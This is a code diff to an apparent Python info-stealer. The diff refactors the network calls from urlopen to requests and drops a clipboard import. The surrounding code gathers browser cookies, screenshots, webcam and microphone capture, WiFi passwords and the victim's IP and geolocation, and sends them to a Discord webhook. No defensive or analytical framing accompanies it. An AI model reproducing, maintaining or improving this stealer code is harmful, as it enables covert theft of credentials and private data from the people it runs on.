@@ -1,7 +1,6 @@
 #Import libraries
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import browser_cookie3
-from urllib.request import urlopen
 import subprocess
 import json
 import socket
@@ -24,7 +23,6 @@ from datetime import datetime, timedelta
 from PIL import ImageGrab
 import cv2
 import requests
-import pyperclip
 import sounddevice as sd
 import numpy as np
 import wavio
@@ -73,21 +71,21 @@ webhook = DiscordWebhook(url=webhookurl)#Set up webhook
 def ip4():#Get ipv4
     try:
      try:
-      with urlopen('https://4.ident.me') as response:
-       return response.read().decode('ascii')
+       ip=requests.get('https://4.ident.me')
+       return ip.text
      except:
-      with urlopen('https://4.tnedi.me') as response:
-       return response.read().decode('ascii')
+       ip=requests.get('https://4.tnedi.me')
+       return ip.text
     except:
         return []
 def ip6():#get ipv6
     try:
      try:
-      with urlopen('https://6.ident.me') as response:
-       return response.read().decode('ascii')
+       ip=requests.get('https://6.ident.me')
+       return ip.text
      except:
-      with urlopen('https://6.tnedi.me') as response:
-       return response.read().decode('ascii')
+       ip=requests.get('https://6.tnedi.me')
+       return ip.text
     except:
         return []
 def wifipass():
@@ -116,9 +114,8 @@ wifi=wifi.replace('}','')
 wifi=wifi.replace(',','\n')
 
 
-url='http://ipinfo.io/json'
-response = urlopen(url)
-data = json.load(response)
+r = requests.get('http://ipinfo.io/json')
+data=r.json()
 
 if 'org' in data:
     org = data['org']
